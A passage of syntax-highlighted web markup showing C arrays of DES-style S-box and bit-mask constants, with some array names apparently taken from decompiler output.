punctuation\">,</span> <span class=\"token number\">0x08020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000208</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x08000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020208</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x08000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x08020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020008</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x08000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000008</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x08020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020200</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s4<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00802001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002080</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00800081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000081</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00800080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00002080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000080</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00802081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800081</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00002001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00800000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00802080</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s5<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x40080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x02000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000100</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x42080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080100</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080100</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x02000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x42080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02080100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40000100</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s6<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x20000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x20004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004010</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400010</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x20400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x20004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000010</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00404010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00404010</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20404000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20004010</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s7<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200800</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x04200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000802</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x04000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200002</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x04200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200800</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x04000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000002</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00200002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200800</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200802</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200002</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s8<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x10001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000040</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x10040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041040</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x10001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001040</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x10041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> word_7FF65FC70900<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x0080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0001</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> dword_7FF65FC70910<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00800000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> byte_7FF65FC70970<span class=\"token punctuation\">[</span><span class=\"token number\">56</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span 